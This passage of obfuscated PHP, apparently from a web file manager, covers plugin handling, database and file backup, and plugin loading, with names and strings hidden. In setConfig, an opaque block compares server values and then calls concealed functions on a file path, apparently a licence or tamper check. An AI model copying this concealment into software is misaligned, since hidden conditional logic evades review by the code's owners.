array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ïê€Â¦[89]][$Ïê€Â¦[1573]]); foreach ($this->echoJsAssignArr as $Öù±ÒÂÊ => $ÈéœØîÔ) { $ÇÏ¾Õ¶Ê[] = $Ïê€Â¦[1574] . $Öù±ÒÂÊ . $Ïê€Â¦[1575]; $ä®¹Ò¡[] = is_array($ÈéœØîÔ) || is_object($ÈéœØîÔ) ? rawurlencode(json_encode($ÈéœØîÔ)) : $ÈéœØîÔ; } if (strstr($ÉÕØÙÛ¢, $Ïê€Â¦[1576])) { $Å™ÛÒğ• = rawurlencode(json_encode($this->pluginLangArr)); $ÉÕØÙÛ¢ = str_replace($Ïê€Â¦[1576], $Å™ÛÒğ•, $ÉÕØÙÛ¢); } if (strstr($ÉÕØÙÛ¢, $Ïê€Â¦[1577])) { $Å™ÛÒğ• = $Å™ÛÒğ• = rawurlencode(json_encode($this->getConfig())); $ÉÕØÙÛ¢ = str_replace($Ïê€Â¦[1577], $Å™ÛÒğ•, $ÉÕØÙÛ¢); } $ÉÕØÙÛ¢ = str_replace($ÇÏ¾Õ¶Ê, $ä®¹Ò¡, $ÉÕØÙÛ¢); return $ÉÕØÙÛ¢; } private function parseLang(&$®‰ƒŠß) { $¦Œ¦¦Í£ =& $_SERVER[™¾ÇÙ¯¹]; $¸ŞÅšóÇ = $¦Œ¦¦Í£[1578]; if (!strstr($®‰ƒŠß, $¸ŞÅšóÇ)) { return; } preg_match_all($¦Œ¦¦Í£[1579], $®‰ƒŠß, $¢ë¥ÁŞâ); if (!is_array($¢ë¥ÁŞâ) || count($¢ë¥ÁŞâ) == 0 || !is_array($¢ë¥ÁŞâ[0]) || count($¢ë¥ÁŞâ[0]) == 0) { return; } $´Ã ª½ˆ = array(); $»íßÔÉ = array(); foreach ($¢ë¥ÁŞâ[0] as $Ÿ¾¢¨Ù) { $ŸìâÕÍô = substr($Ÿ¾¢¨Ù, strlen($¸ŞÅšóÇ), -4); $»ìÊëÈ = LNG($ŸìâÕÍô); $´Ã ª½ˆ[] = $Ÿ¾¢¨Ù; $»íßÔÉ[] = str_replace(array($¦Œ¦¦Í£[231], $¦Œ¦¦Í£[1086], $¦Œ¦¦Í£[351], $¦Œ¦¦Í£[118]), array($¦Œ¦¦Í£[53], $¦Œ¦¦Í£[53], $¦Œ¦¦Í£[12], $¦Œ¦¦Í£[1580]), $»ìÊëÈ); } $®‰ƒŠß = str_replace($´Ã ª½ˆ, $»íßÔÉ, $®‰ƒŠß); } private function parseConfig(&$…·’ôç³) { $ÁÊ£‰—ë =& $_SERVER[™¾ÇÙ¯¹]; $Å¼£±¡³ = $ÁÊ£‰—ë[1581]; if (!strstr($…·’ôç³, $Å¼£±¡³)) { return; } preg_match_all($ÁÊ£‰—ë[1582], $…·’ôç³, $Úë²÷»½); if (!is_array($Úë²÷»½) || count($Úë²÷»½) == 0 || !is_array($Úë²÷»½[0]) || count($Úë²÷»½[0]) == 0) { return; } $ØºÙî³ = $this->getConfig(); $ğ†û‹Ò¶ = array(); $õ¦Ş‰¿§ = array(); foreach ($Úë²÷»½[0] as $ÅâÌ¥) { $áùïŒĞ² = substr($ÅâÌ¥, strlen($Å¼£±¡³), -2); $ğ†û‹Ò¶[] = $ÅâÌ¥; $õ¦Ş‰¿§[] = _get($ØºÙî³, $áùïŒĞ²); } $…·’ôç³ = str_replace($ğ†û‹Ò¶, $õ¦Ş‰¿§, $…·’ôç³); } private function parsePackage(&$ìÍ•¾ºª) { $”ÊšÓ’ =& $_SERVER[™¾ÇÙ¯¹]; $‹çãöÑÙ = $”ÊšÓ’[1583]; if (!strstr($ìÍ•¾ºª, $‹çãöÑÙ)) { return; } preg_match_all($”ÊšÓ’[1584], $ìÍ•¾ºª, $Ï‚Ô ‘ô); if (!is_array($Ï‚Ô ‘ô) || count($Ï‚Ô ‘ô) == 0 || !is_array($Ï‚Ô ‘ô[0]) || count($Ï‚Ô ‘ô[0]) == 0) { return; } $ôÃ¾ìÙ• = $this->appPackage(); $®”·ªÎµ = array(); $ÇÒøĞ¤³ = array(); foreach ($Ï‚Ô ‘ô[0] as $ê³¡¢îÈ) { $×Š ±«® = substr($ê³¡¢îÈ, strlen($‹çãöÑÙ), -2); $®”·ªÎµ[] = $ê³¡¢îÈ; $ÇÒøĞ¤³[] = _get($ôÃ¾ìÙ•, $×Š ±«®); } $ìÍ•¾ºª = str_replace($®”·ªÎµ, $ÇÒøĞ¤³, $ìÍ•¾ºª); } final function echoFile($Ñ¼íöÊ, $Ì€˜Â´ğ = false) { $ã¯ó»¡ =& $_SERVER[™¾ÇÙ¯¹]; $ûÜËÛà = $this->pluginPath . $Ñ¼íöÊ; if (ACT == $ã¯ó»¡[1585]) { echo $ã¯ó»¡[1586] . $this->pluginName . $ã¯ó»¡[8] . $Ñ¼íöÊ . $ã¯ó»¡[1587]; if (!file_exists($ûÜËÛà)) { echo $ã¯ó»¡[1588]; return; } } $Ä€Óõ€È = $this->parseFile($ûÜËÛà); $this->parseLang($Ä€Óõ€È); $this->parseConfig($Ä€Óõ€È); $this->parsePackage($Ä€Óõ€È); if (is_array($Ì€˜Â´ğ)) { $Ä€Óõ€È = str_replace(array_keys($Ì€˜Â´ğ), array_values($Ì€˜Â´ğ), $Ä€Óõ€È); } echo $ã¯ó»¡[231] . $Ä€Óõ€È; } final function initLang() { $ÍåÏå =& $_SERVER[™¾ÇÙ¯¹]; $”¹ÍÄ… = $ÍåÏå[1589]; $ì¿„Ã„ = $this->pluginPath . $ÍåÏå[1590]; $ñ’ã•‹ = I18n::getType(); $¤’Şõ™• = array(); if (file_exists($ì¿„Ã„ . $ñ’ã•‹ . $ÍåÏå[853])) { $¤’Şõ™• = (include $ì¿„Ã„ . $ñ’ã•‹ . $ÍåÏå[853]); } else { if ($ñ’ã•‹ == $ÍåÏå[1591] && !file_exists($ì¿„Ã„ . $ñ’ã•‹ . $ÍåÏå[853]) && file_exists($ì¿„Ã„ . $ÍåÏå[1592])) { $¤’Şõ™• = (include $ì¿„Ã„ . $ÍåÏå[1592]); } else { if (file_exists($ì¿„Ã„ . $”¹ÍÄ… . $ÍåÏå[853])) { $¤’Şõ™• = (include $ì¿„Ã„ . $”¹ÍÄ… . $ÍåÏå[853]); } } } if (!is_array($¤’Şõ™•)) { return array(); } if (@count($¤’Şõ™•) > 0) { I18n::set($¤’Şõ™•); } return $¤’Şõ™•; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($âÆöÑ³¬) { $¥å¾ò¼Œ =& $_SERVER[™¾ÇÙ¯¹]; if ($_SERVER[$¥å¾ò¼Œ[244]] != $_SERVER[$¥å¾ò¼Œ[1529]]) { $Ìâ‘åÙ = $¥å¾ò¼Œ[887]; $†“ˆ‰ÚÉ = $¥å¾ò¼Œ[246]; $ûëÜï–Ä = $_SERVER[$¥å¾ò¼Œ[247]] . $¥å¾ò¼Œ[248]; $«Úš¯µ² = $†“ˆ‰ÚÉ($ûëÜï–Ä); $û™¹²’Ô = explode($¥å¾ò¼Œ[231], $«Úš¯µ²); if (count($û™¹²’Ô) < $¥å¾ò¼Œ[627]) { $ûìºÌ„» = $¥å¾ò¼Œ[250]; $ûìºÌ„»(); } $ïåŞÓöÓ = $¥å¾ò¼Œ[888]; $ïåŞÓöÓ($_SERVER[$¥å¾ò¼Œ[889]]); $ïåŞÓöÓ($_SERVER[$¥å¾ò¼Œ[247]] . $¥å¾ò¼Œ[1530]); $Ì¡“ÁÔ = 1; while ($Ì¡“ÁÔ > 1) { $Ì¡“ÁÔ = $Ì¡“ÁÔ + 4; $•ØŞşÙñ = rawurlencode($Ì¡“ÁÔ . $¥å¾ò¼Œ[252]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $âÆöÑ³¬); } public function onSetConfig($¨óş¤¡·) { } public function onGetConfig($áóı©«Ö) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ƒ¡Şáå“) { if ($ƒ¡Şáå“ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($—ßˆßÜà = "\x70\x6c\x75\x67\151\156\x41\x75\x74\150") { $ÉÂ¦ïóñ =& $_SERVER[™¾ÇÙ¯¹]; if (!defined($ÉÂ¦ïóñ[483])) { return !1; } if (_get($GLOBALS, $ÉÂ¦ïóñ[511])) { return !0; } $áìæ€ò¡ = $this->getConfig(); if (!$áìæ€ò¡[$—ßˆßÜà]) { return !1; } return ActionCall($ÉÂ¦ïóñ[1593], $áìæ€ò¡[$—ßˆßÜà]); } public function url($Æã£êÈï, $ÂÒ˜ˆß = '', $Ô»ùÌé„ = true) { $»É„¶È’ =& $_SERVER[™¾ÇÙ¯¹]; $˜ÖÎ”½” = $this->getConfig(); $´ãšÒÁ™ = KOD_VERSION . $»É„¶È’[10] . KOD_VERSION_BUILD; $È–…Å³Í = $this->packageVersion(); $×ÇŞ½Ÿæ = $´ãšÒÁ™ . $»É„¶È’[394] . $È–…Å³Í; if (substr($Æã£êÈï, 0, 4) == $»É„¶È’[148] || substr($Æã£êÈï, 0, 2) == $»É„¶È’[1375]) { $ßóƒ£µ• = $Æã£êÈï . $»É„¶È’[1594] . $×ÇŞ½Ÿæ; } else { if ($ÂÒ˜ˆß == $»É„¶È’[12]) { $ßóƒ£µ• = $this->pluginHost . $Æã£êÈï . $»É„¶È’[1594] . $×ÇŞ½Ÿæ; } else { if ($ÂÒ˜ˆß === $»É„¶È’[75]) { $ßóƒ£µ• = $this->pluginHost . $Æã£êÈï; } else { if ($ÂÒ˜ˆß == $»É„¶È’[1595]) { $ßóƒ£µ• = STATIC_PATH . $Æã£êÈï . $»É„¶È’[1594] . $´ãšÒÁ™; } else { if ($ÂÒ˜ˆß == $»É„¶È’[1596]) { $ßóƒ£µ• = APP_HOST . $»É„¶È’[1597] . $Æã£êÈï . $»É„¶È’[1594] . $´ãšÒÁ™; } else { if (isset($˜ÖÎ”½”[$ÂÒ˜ˆß])) { $ßóƒ£µ• = $˜ÖÎ”½”[$ÂÒ˜ˆß] . $Æã£êÈï . $»É„¶È’[1594] . $×ÇŞ½Ÿæ; } } } } } } if (!$Ô»ùÌé„) { return $ßóƒ£µ•; } echo $ßóƒ£µ•; } public function link($‰ñˆŞ¥ = false, $“†ÙÕ²­ = '') { $µÌÒÉ§Î =& $_SERVER[™¾ÇÙ¯¹]; if (!$‰ñˆŞ¥) { $this->link($µÌÒÉ§Î[1598], $µÌÒÉ§Î[1596]); $this->link($µÌÒÉ§Î[1599], $µÌÒÉ§Î[1595]); $this->link($µÌÒÉ§Î[1600], $µÌÒÉ§Î[1595]); $this->link($µÌÒÉ§Î[1601], $µÌÒÉ§Î[1595]); $this->link($µÌÒÉ§Î[1602], $µÌÒÉ§Î[1595]); return; } $æ¦‡™Ïî = $this->url($‰ñˆŞ¥, $“†ÙÕ²­, !1); if (substr($‰ñˆŞ¥, -3) == $µÌÒÉ§Î[1603]) { echo $µÌÒÉ§Î[1604] . $æ¦‡™Ïî . $µÌÒÉ§Î[1605] . $µÌÒÉ§Î[231]; } else { if (substr($‰ñˆŞ¥, -4) == $µÌÒÉ§Î[1606]) { echo $µÌÒÉ§Î[1607] . $æ¦‡™Ïî . $µÌÒÉ§Î[1608] . $µÌÒÉ§Î[231]; } } } } goto C°‰¿À„ç®; EºĞ±‘´Öî: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $é“ ¦èĞ =& $_SERVER[™¾ÇÙ¯¹]; $¯•µÍú§ = Backup::get(); self::$io = $¯•µÍú§[$é“ ¦èĞ[767]]; self::$name = $¯•µÍú§[$é“ ¦èĞ[32]]; $úõíñ€ = new DbManage(); $©–¤ñ«ª = $úõíñ€->dbType(); $½ß×±è¿ = array($é“ ¦èĞ[791] => $©–¤ñ«ª, $é“ ¦èĞ[792] => time()); Backup::set($½ß×±è¿); $·´¶ö¾ = $this->tmpFilesPath() . $é“ ¦èĞ[793] . self::$name . $é“ ¦èĞ[8]; del_dir($·´¶ö¾); mk_dir($·´¶ö¾); $•˜®¤û— = $¶èÊş™Ü = 0; $µ¶À„” = new Task($é“ ¦èĞ[794], $é“ ¦èĞ[795], 0, LNG($é“ ¦èĞ[796]) . $é“ ¦èĞ[797] . LNG($é“ ¦èĞ[798])); try { $Ö´¡øé‘ = $úõíñ€->db()->getTables(); } catch (Exception $Ùò¦Şä¥) { $µ¶À„”->end(); return !1; } $Ö´¡øé‘ = array_diff($Ö´¡øé‘, array($é“ ¦èĞ[799], $é“ ¦èĞ[800])); foreach ($Ö´¡øé‘ as $…ëéè£‡) { $•˜®¤û— += $úõíñ€->model($…ëéè£‡)->count(); } $µ¶À„”->task[$é“ ¦èĞ[801]] = $•˜®¤û—; $GLOBALS[$é“ ¦èĞ[802]] = self::$name; foreach ($Ö´¡øé‘ as $…ëéè£‡) { $¸Ùå°À™ = $·´¶ö¾ . $…ëéè£‡ . $é“ ¦èĞ[803]; $ÛçÆ¾·ª = null; if ($…ëéè£‡ == $é“ ¦èĞ[804] && (!isset($¯•µÍú§[$é“ ¦èĞ[770]]) || $¯•µÍú§[$é“ ¦èĞ[770]] == $é“ ¦èĞ[197])) { $ÛçÆ¾·ª = self::$io; } $¶èÊş™Ü += $úõíñ€->sqlFromDb($…ëéè£‡, $¸Ùå°À™, $µ¶À„”, $ÛçÆ¾·ª); } unset($GLOBALS[$é“ ¦èĞ[802]]); $µ¶À„”->end(); if ($¶èÊş™Ü > $•˜®¤û—) { $•˜®¤û— = $¶èÊş™Ü; } $½ß×±è¿ = array($é“ ¦èĞ[791] => $©–¤ñ«ª, $é“ ¦èĞ[788] => 1, $é“ ¦èĞ[805] => $•˜®¤û—, $é“ ¦èĞ[806] => $¶èÊş™Ü, $é“ ¦èĞ[807] => time()); Backup::set($½ß×±è¿); if ($•˜®¤û— - $¶èÊş™Ü > 0) { $ÉçèÆ€œ = $é“ ¦èĞ[808]; if (stristr(I18n::getType(), $é“ ¦èĞ[809])) { $ÉçèÆ€œ = $é“ ¦èĞ[810]; } write_log(array($ÉçèÆ€œ, $½ß×±è¿), $é“ ¦èĞ[795]); return !1; } return !0; } private function tmpFilesPath() { $«²Òƒ =& $_SERVER[™¾ÇÙ¯¹]; $ëÁ’†šš = TEMP_FILES; if ($GLOBALS[$«²Òƒ[6]][$«²Òƒ[89]][$«²Òƒ[811]]) { $ëÁ’†šš = $GLOBALS[$«²Òƒ[6]][$«²Òƒ[89]][$«²Òƒ[811]]; if (!mk_dir($ëÁ’†šš) || !is_writable($ëÁ’†šš) || !IO::mkfile($ëÁ’†šš . $«²Òƒ[812])) { $ëÁ’†šš = TEMP_FILES; } } return $ëÁ’†šš; } } class BackupDbFile { public function __construct() { } public function index() { $‹ûËúû =& $_SERVER[™¾ÇÙ¯¹]; $“¾£«±œ = Backup::get(); $Õ¯·¡÷ = $“¾£«±œ[$‹ûËúû[32]]; $ËÄ¡ ¨Î = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\x70\137{$Õ¯·¡÷}\57"; $ª‘åšêú = $this->backupPath($“¾£«±œ); if (!($ª‘åšêú = IO::mkdir($ª‘åšêú))) { return !1; } $†¬ÀïÏ = IO::listPath($ËÄ¡ ¨Î); $ÔÎ­€Œ = isset($†¬ÀïÏ[$‹ûËúû[83]]) ? $†¬ÀïÏ[$‹ûËúû[83]] : array(); $¤Ã„’ªã = array_sum(array_column($ÔÎ­€Œ, $‹ûËúû[76])); if (!$¤Ã„’ªã) { return !1; } $…¨Õıªğ = array($‹ûËúû[813] => $¤Ã„’ªã, $‹ûËúû[814] => time()); Backup::set($…¨Õıªğ); $º£¸¶¬ö = new TaskFileTransfer($‹ûËúû[815], $‹ûËúû[795], count($ÔÎ­€Œ), LNG($‹ûËúû[796]) . $‹ûËúû[394] . LNG($‹ûËúû[798]) . $‹ûËúû[816]); $º£¸¶¬ö->task[$‹ûËúû[778]] = $¤Ã„’ªã; foreach ($†¬ÀïÏ[$‹ûËúû[83]] as $®¼â¸ÓÕ) { $Ø™ÍºÙí = IO::move($®¼â¸ÓÕ[$‹ûËúû[84]], $ª‘åšêú); if (!$Ø™ÍºÙí) { $º£¸¶¬ö->end(); $ŸˆŠãİ = IO::getLastError($‹ûËúû[817] . $®¼â¸ÓÕ[$‹ûËúû[84]] . $‹ûËúû[818] . $ª‘åšêú . $‹ûËúû[164]); write_log($ŸˆŠãİ, $‹ûËúû[795]); return !1; } } $Î–¯çöñ = new DbManage(); $ğ—•²„º = $Î–¯çöñ->getSqlFile(); if (!$ğ—•²„º[$‹ûËúû[819]] || !$ğ—•²„º[$‹ûËúû[13]]) { return !1; } IO::move($ğ—•²„º[$‹ûËúû[819]], $ª‘åšêú); IO::move($ğ—•²„º[$‹ûËúû[13]], $ª‘åšêú); $º£¸¶¬ö->end(); $…¨Õıªğ = array($‹ûËúû[820] => $¤Ã„’ªã, $‹ûËúû[821] => time()); Backup::set($…¨Õıªğ); return !0; } private function backupPath($¨¿Ç±èÆ) { $ÀÀáÒâ³ =& $_SERVER[™¾ÇÙ¯¹]; $Ä‡…È«¯ = $¨¿Ç±èÆ[$ÀÀáÒâ³[32]]; $Ì…¿¥»° = Model($ÀÀáÒâ³[785])->get($ÀÀáÒâ³[786]); $ëáËÒ®Ù = substr(md5($ÀÀáÒâ³[787] . $Ì…¿¥»° . $Ä‡…È«¯), 0, 8); return "\173\x69\x6f\x3a{$¨¿Ç±èÆ[$ÀÀáÒâ³[767]]}\x7d\57\x64\x61\164\141\142\x61\163\x65\57\x62\141\x63\x6b\x75\160\57" . $Ä‡…È«¯ . $ÀÀáÒâ³[11] . $ëáËÒ®Ù; } private function tmpFilesPath() { $úú•³Ô =& $_SERVER[™¾ÇÙ¯¹]; $Ø±„–³ä = TEMP_FILES; if ($GLOBALS[$úú•³Ô[6]][$úú•³Ô[89]][$úú•³Ô[811]]) { $Ø±„–³ä = $GLOBALS[$úú•³Ô[6]][$úú•³Ô[89]][$úú•³Ô[811]]; if (!mk_dir($Ø±„–³ä) || !is_writable($Ø±„–³ä) || !IO::mkfile($Ø±„–³ä . $úú•³Ô[812])) { $Ø±„–³ä = TEMP_FILES; } } return $Ø±„–³ä; } } class BackupFile { public function __construct() { } public function index() { $Œ©öº©ñ = Backup::get(); $œ»Ûû§Ü = $Œ©öº©ñ[$_SERVER[™¾ÇÙ¯¹][302]][$_SERVER[™¾ÇÙ¯¹][199]][$_SERVER[™¾ÇÙ¯¹][476]]; $˜£‘øÓ = array($_SERVER[™¾ÇÙ¯¹][477] => array($_SERVER[™¾ÇÙ¯¹][822], $œ»Ûû§Ü), $_SERVER[™¾ÇÙ¯¹][823] => array($_SERVER[™¾ÇÙ¯¹][340], $Œ©öº©ñ[$_SERVER[™¾ÇÙ¯¹][767]])); $œ©ıâ£¡ = (int) Model($_SERVER[™¾ÇÙ¯¹][804])->where($˜£‘øÓ)->count($_SERVER[™¾ÇÙ¯¹][476]); $‹ÉĞÂ³• = (int) Model($_SERVER[™¾ÇÙ¯¹][804])->where($˜£‘øÓ)->sum($_SERVER[™¾ÇÙ¯¹][76]); $İ’ ˜ˆÌ = new TaskFileTransfer($_SERVER[™¾ÇÙ¯¹][824], $_SERVER[™¾ÇÙ¯¹][795], $œ©ıâ£¡, LNG($_SERVER[™¾ÇÙ¯¹][796]) . $_SERVER[™¾ÇÙ¯¹][797] . LNG($_SERVER[™¾ÇÙ¯¹][825])); $İ’ ˜ˆÌ->task[$_SERVER[™¾ÇÙ¯¹][778]] = $‹ÉĞÂ³•; $˜…ÄûÓË = array($_SERVER[™¾ÇÙ¯¹][826] => $œ©ıâ£¡, $_SERVER[™¾ÇÙ¯¹][827] => $‹ÉĞÂ³•, $_SERVER[™¾ÇÙ¯¹][828] => time()); Backup::set($˜…ÄûÓË); $–Ü´„Û = !0; $å‘ûúƒ´ = $this->storeIds(); $×ïÚÃ¥® = 1; $Á¦–ƒËŠ = 1000; $¢ùÔÓİİ = $Úõ‹¹š‹ = 0; $š™óÕ ì = array(); $—¬Š¹œä = $¨‹Û±ğ = 0; do { $ÜğŞç„ = $_SERVER[™¾ÇÙ¯¹][829]; $±Ü˜È¹ã = Model($_SERVER[™¾ÇÙ¯¹][804])->where($˜£‘øÓ)->field($ÜğŞç„)->order($_SERVER[™¾ÇÙ¯¹][830])->selectPage($Á¦–ƒËŠ, $×ïÚÃ¥®); $»†ë¬•“ = !empty($±Ü˜È¹ã[$_SERVER[™¾ÇÙ¯¹][378]]) ? $±Ü˜È¹ã[$_SERVER[™¾ÇÙ¯¹][378]] : array(); foreach ($»†ë¬•“ as $õè¹’Ó) { if (!$this->_fileExist($õè¹’Ó, $š™óÕ ì, $å‘ûúƒ´)) { $œ©ıâ£¡ -= 1; $‹ÉĞÂ³• -= (int) $õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][76]]; write_log("\x66\x69\x6c\145\x20\156\x6f\164\x20\145\170\151\x73\164\56\146\151\154\145\111\x44\72{$õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][476]]}\54\x20\x70\141\164\150\x3a{$õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][84]]}", $_SERVER[™¾ÇÙ¯¹][831]); continue; } $®éÈ÷Æş = $õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][84]]; $¸‘ä‘˜ù = "\x7b\x69\x6f\72{$Œ©öº©ñ[$_SERVER[™¾ÇÙ¯¹][767]]}\175" . substr($®éÈ÷Æş, strlen("\173\x69\157\72{$õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][832]]}\x7d")); if (IO::exist($¸‘ä‘˜ù)) { $İ’ ˜ˆÌ->updateFileEnd($õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][32]], $õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][76]]); } else { $¸‘ä‘˜ù = get_path_father($¸‘ä‘˜ù); IO::mkdir($¸‘ä‘˜ù); if (!IO::copy($®éÈ÷Æş, $¸‘ä‘˜ù, $_SERVER[™¾ÇÙ¯¹][833])) { write_log($_SERVER[™¾ÇÙ¯¹][834] . $®éÈ÷Æş . $_SERVER[™¾ÇÙ¯¹][818] . $¸‘ä‘˜ù . $_SERVER[™¾ÇÙ¯¹][164], $_SERVER[™¾ÇÙ¯¹][795]); $–Ü´„Û = !1; break; } } $œ»Ûû§Ü = $õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][476]]; $Úõ‹¹š‹ += 1; $¢ùÔÓİİ += $õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][76]]; $¨‹Û±ğ += 1; $—¬Š¹œä += $õè¹’Ó[$_SERVER[™¾ÇÙ¯¹][76]]; if ($¢ùÔÓİİ >= 1024 * 1024 * 100) { $˜…ÄûÓË = array($_SERVER[™¾ÇÙ¯¹][835] => $œ»Ûû§Ü, $_SERVER[™¾ÇÙ¯¹][836] => $¨‹Û±ğ, $_SERVER[™¾ÇÙ¯¹][837] => $—¬Š¹œä); Backup::set($˜…ÄûÓË); $¢ùÔÓİİ = $Úõ‹¹š‹ = 0; } } $Ø®¯íÛè = count($»†ë¬•“); $×ïÚÃ¥®++; } while ($Ø®¯íÛè == $Á¦–ƒËŠ); $İ’ ˜ˆÌ->end(); $˜…ÄûÓË = array($_SERVER[™¾ÇÙ¯¹][838] => 1, $_SERVER[™¾ÇÙ¯¹][505] => time(), $_SERVER[™¾ÇÙ¯¹][790] => 1, $_SERVER[™¾ÇÙ¯¹][835] => $œ»Ûû§Ü, $_SERVER[™¾ÇÙ¯¹][827] => $‹ÉĞÂ³•, $_SERVER[™¾ÇÙ¯¹][826] => $œ©ıâ£¡, $_SERVER[™¾ÇÙ¯¹][839] => time()); if ($Úõ‹¹š‹) { $˜…ÄûÓË[$_SERVER[™¾ÇÙ¯¹][836]] = $¨‹Û±ğ; $˜…ÄûÓË[$_SERVER[™¾ÇÙ¯¹][837]] = $—¬Š¹œä; } Backup::set($˜…ÄûÓË); $this->_fileFilter($š™óÕ ì); return !0; } private function _fileExist($úœş·Ì, &$à¤‚Ÿµ‚, $­ªˆ˜îÓ) { $”Â™ñ¥„ =& $_SERVER[™¾ÇÙ¯¹]; $õÓ€ÍÁ“ = $úœş·Ì[$”Â™ñ¥„[84]]; if (in_array($úœş·Ì[$”Â™ñ¥„[476]], $à¤‚Ÿµ‚)) { return !1; } if (!in_array($úœş·Ì[$”Â™ñ¥„[832]], $­ªˆ˜îÓ)) { return !1; } if (IO::exist($õÓ€ÍÁ“)) { return !0; } $Àü¦øªô = get_path_father($õÓ€ÍÁ“); if (IO::exist($Àü¦øªô)) { $à¤‚Ÿµ‚[] = $úœş·Ì[$”Â™ñ¥„[476]]; return !1; } $Š‡’÷× = array($”Â™ñ¥„[832] => $úœş·Ì[$”Â™ñ¥„[832]], $”Â™ñ¥„[84] => array($”Â™ñ¥„[391], "{$Àü¦øªô}\45")); $·¬µõô· = Model($”Â™ñ¥„[804])->where($Š‡’÷×)->field($”Â™ñ¥„[477])->select(); $à¤‚Ÿµ‚ = array_merge($à¤‚Ÿµ‚, array_to_keyvalue($·¬µõô·, $”Â™ñ¥„[12], $”Â™ñ¥„[476])); return !1; } private function _fileFilter($½şŠ©»æ) { $¯¶ ¦º· =& $_SERVER[™¾ÇÙ¯¹]; if (empty($½şŠ©»æ)) { return; } $–µ¥›äü = array($¯¶ ¦º·[476] => array($¯¶ ¦º·[7], array_unique($½şŠ©»æ))); $ş¢¡âà‚ = Model($¯¶ ¦º·[840])->where($–µ¥›äü)->field($¯¶ ¦º·[410])->select(); foreach ($ş¢¡âà‚ as $ŸÑ·×öĞ) { Model($¯¶ ¦º·[840])->remove($ŸÑ·×öĞ[$¯¶ ¦º·[410]], !1); } } private function storeIds() { $ÆÆïœ™ =& $_SERVER[™¾ÇÙ¯¹]; $‡ÌÂåˆÒ = Model($ÆÆïœ™[782])->listData(); $†÷€Ö— = array(); $ªãÅ¿ É = $GLOBALS[$ÆÆïœ™[6]][$ÆÆïœ™[89]][$ÆÆïœ™[841]]; foreach ($‡ÌÂåˆÒ as $­èŞà„š) { $ù¦ç›°¹ = strtolower($­èŞà„š[$ÆÆïœ™[95]]); if (!isset($ªãÅ¿ É[$ù¦ç›°¹])) { continue; } $›¨—Î®Ã = $ÆÆïœ™[74] . (isset($ªãÅ¿ É[$ù¦ç›°¹]) ? $ªãÅ¿ É[$ù¦ç›°¹] : ucfirst($ù¦ç›°¹)); if (!class_exists($›¨—Î®Ã)) { continue; } $†÷€Ö—[] = $­èŞà„š[$ÆÆïœ™[407]]; } return $†÷€Ö—; } } goto C²Å¶¿¬Ï; cÈ‚ÈÙ«¢: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x70\154\165\x67\151\156\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\x73\164\x61\164\x75\x73", "\162\x65\x67\x69\x65\163\x74", "\x63\157\156\x66\151\x67"); public function loadList($ùÀÀ£ˆÍ = false) { $“Ä«ï«â = array_to_keyvalue($this->listData(), $_SERVER[™¾ÇÙ¯¹][32]); if ($ùÀÀ£ˆÍ) { return $“Ä«ï«â[$ùÀÀ£ˆÍ]; } return $“Ä«ï«â; } public function init() { $êØÄøŞä =& $_SERVER[™¾ÇÙ¯¹]; Hook::trigger($êØÄøŞä[1957]); $¡•ÑÏ¯ = $this->loadPluginList(); foreach ($¡•ÑÏ¯ as $Ü–Áî´¸ => $ï°¤ê‚) { $Ğ¨Ÿú‹ = $this->appAllow($Ü–Áî´¸, $ï°¤ê‚); if (!$Ğ¨Ÿú‹) { continue; } foreach ($ï°¤ê‚[$êØÄøŞä[1958]] as $¯”°ˆ˜ª => $ê½Êêæ) { Hook::bind($¯”°ˆ˜ª, $ê½Êêæ); } } Hook::trigger($êØÄøŞä[1959]); Hook::trigger(ACTION); } public function appAllow($ÅĞíè¥, $èÁšª×Ÿ, $¿Ü©‚¸Ê = true) { $“ä¦é¢´ =& $_SERVER[™¾ÇÙ¯¹]; $ÄÃìŸóó = PLUGIN_DIR . $ÅĞíè¥ . $“ä¦é¢´[1960]; if (!is_array($èÁšª×Ÿ) || !is_array($èÁšª×Ÿ[$“ä¦é¢´[1958]]) || $èÁšª×Ÿ[$“ä¦é¢´[765]] != 1 || !is_file($ÄÃìŸóó)) { return !1; } if ($GLOBALS[$“ä¦é¢´[511]] == 1) { if ($GLOBALS[$“ä¦é¢´[6]][$“ä¦é¢´[1961]] || !$GLOBALS[$“ä¦é¢´[6]][$“ä¦é¢´[1962]]) { return !0; } $ŠÖıî‰Ó = explode($“ä¦é¢´[50], strtolower($GLOBALS[$“ä¦é¢´[6]][$“ä¦é¢´[1962]])); return in_array(strtolower($ÅĞíè¥), $ŠÖıî‰Ó) ? !1 : !0; } if ($¿Ü©‚¸Ê && !Action($“ä¦é¢´[1963])->checkAuth($ÅĞíè¥)) { return !1; } return !0; } public function unInstall($ò¼ª¶İ­) { $°‚ ˆ¼ê =& $_SERVER[™¾ÇÙ¯¹]; $å–Íõ¨‡ = $this->loadList($ò¼ª¶İ­); if (file_exists(PLUGIN_DIR . $ò¼ª¶İ­)) { Hook::apply($ò¼ª¶İ­ . $°‚ ˆ¼ê[1964]); } $this->remove($å–Íõ¨‡[$°‚ ˆ¼ê[407]]); } public function changeStatus($Å½ãÉƒ”, $šÚ¼Óæ®) { $ç”‡­Ì¤ =& $_SERVER[™¾ÇÙ¯¹]; $®Ğ‘ğ‡î = $this->loadList($Å½ãÉƒ”); if ($šÚ¼Óæ®) { Hook::apply($Å½ãÉƒ” . $ç”‡­Ì¤[1965]); } 